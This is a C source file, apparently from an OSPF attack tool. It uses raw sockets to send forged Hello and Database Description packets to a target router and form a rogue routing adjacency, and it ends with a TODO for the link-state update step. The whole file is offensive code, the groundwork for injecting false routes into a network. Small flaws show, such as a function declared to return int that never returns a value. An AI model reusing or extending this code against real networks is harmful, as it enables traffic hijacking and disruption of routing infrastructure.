#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/if_ether.h>
#include <netinet/ether.h>
#include <netinet/ip.h>

#include "ospf.h"
#include "ospf_attack.h"
#include "utils.h"

int attack_wait_for_db_description(struct attack_env *env);
void attack_sync_db_desc(struct attack_env *env);
int attack_send_db_description(struct attack_env *env, __u32 sequence_number, __u8 control);

void attack_establish_adjacency(struct attack_env *env) {
  int ret_value;
  fprintf(stderr, "ESTABLISHING ADJACENCY\n");

  int packet_len = ospf_multicast_hello(env->buffer, env->local_mac, env->local_ip, env->router_ip);
  fprintf(stderr, "- Sending multicast hello... ");
  if((ret_value = send_packet(env->sock_fd, parse_mac_addr(IPV4_MULTICAST_MAC), env->buffer, env->iface_index, packet_len)) < 0) {
    die("\nFATAL: Error sending Hello packet\n");
  }
  fprintf(stderr, "DONE (%d)\n", ret_value);

  attack_sync_db_desc(env);

  printf("TODO: Wait for LS update to my IP and send ack\n");
}

void attack_sync_db_desc(struct attack_env *env) {
  int ret_value;
  unsigned long dd_seq_number = 10000;

  if ((ret_value = attack_wait_for_db_description(env)) < 0) {
    die("Error while waiting for DB description");
  }
  // Store the mac address sent by the router
  struct ether_header *eth_header = (struct ether_header *)env->buffer;
  env->router_mac = calloc(sizeof(unsigned char), MAC_ADDR_LEN);
  memcpy(env->router_mac, eth_header->ether_shost, MAC_ADDR_LEN);
  fprintf(stderr, "- Router MAC set to: %x:%x:%x:%x:%x:%x \n", env->router_mac[0],env->router_mac[1],env->router_mac[2],env->router_mac[3],env->router_mac[4],env->router_mac[5]);

  fprintf(stderr, "- Sending DB description with INIT, MORE and MASTER/SLAVE... ");
  attack_send_db_description(env, dd_seq_number, DDC_INIT + DDC_MORE + DDC_MSTR);
  fprintf(stderr, "DONE (%d)\n", ret_value);
  dd_seq_number += 1;

  if ((ret_value = attack_wait_for_db_description(env)) < 0) {
    die("Error while waiting for DB description");
  }
  struct ospf_dd *db_desc = (struct ospf_dd *)(env->buffer + ret_value);

  while (db_desc->dd_control != 0) {
    fprintf(stderr, "- MORE flag is set, sending another DB description with MORE and MASTER/SLAVE... ");
    attack_send_db_description(env, dd_seq_number, DDC_MORE + DDC_MSTR);
    fprintf(stderr, "DONE (%d)\n", ret_value);
    dd_seq_number += 1;

    if ((ret_value = attack_wait_for_db_description(env)) < 0) {
      die("Error while waiting for DB description");
    }
    db_desc = (struct ospf_dd *)(env->buffer + ret_value);
  }

  fprintf(stderr, "- Sending the last DB description with the MASTER/SLAVE flag set... ");
  attack_send_db_description(env, dd_seq_number, DDC_MSTR);
  fprintf(stderr, "DONE (%d)\n", ret_value);
  dd_seq_number += 1;

  if ((ret_value = attack_wait_for_db_description(env)) < 0) {
    die("Error while waiting for DB description");
  }
  db_desc = (struct ospf_dd *)(env->buffer + ret_value);
  if (db_desc->dd_control != 0) {
    die("Unexpected DB description message received");
  }
}

int attack_wait_for_db_description(struct attack_env *env) {
  struct ip *ip_header;
  struct ether_header *eth_header;
  struct ospf_header *ospf_header;

  fprintf(stderr, "- Waiting for DB description...");
  while (1) {
    if (recv(env->sock_fd, (char *)env->buffer, sizeof(env->buffer), 0x0) < 0) {
      printf("RECV on OSPF Hello...\n");
      // If an error occured, check if it was a timeout and try again
      if (errno == EAGAIN || errno == EWOULDBLOCK) {
        continue;
      } else {
        die("Unknown error while reading from socket");
      }
    }
    fprintf(stderr, ".");

    unsigned char *buffer_ptr = env->buffer;

    eth_header = (struct ether_header *)buffer_ptr;
    if (eth_header->ether_type != htons(0x0800)) continue;
    buffer_ptr += sizeof(struct ether_header);

    ip_header = (struct ip *)buffer_ptr;
    if (ip_header->ip_p != PROTO_OSPF) continue;
    buffer_ptr += ip_header->ip_hl * 4;

    ospf_header = (struct ospf_header *)buffer_ptr;
    if (ospf_header->ospf_type != OSPF_DATADESC_T) continue;

    // Is it a message from the router?
    if (((__u32)ip_header->ip_src.s_addr) != inet_addr(env->router_ip)) continue;

    // Is it a message for me?
    if (ip_header->ip_dst.s_addr != inet_addr(env->local_ip)) continue;

    fprintf(stderr, " CAPTURED\n");

    break;
  }
  return sizeof(struct ether_header) + ip_header->ip_hl * 4 + sizeof(struct ospf_header);
}

int attack_send_db_description(struct attack_env *env, __u32 sequence_number, __u8 control) {
  int packet_len = ospf_db_description(env->buffer, env->local_mac, env->local_ip, env->router_mac, env->router_ip, sequence_number, control);
  if (send_packet(env->sock_fd, env->router_mac, env->buffer, env->iface_index, packet_len) < 0) {
    die("\nFATAL: Error sending DB description packet\n");
  }
}
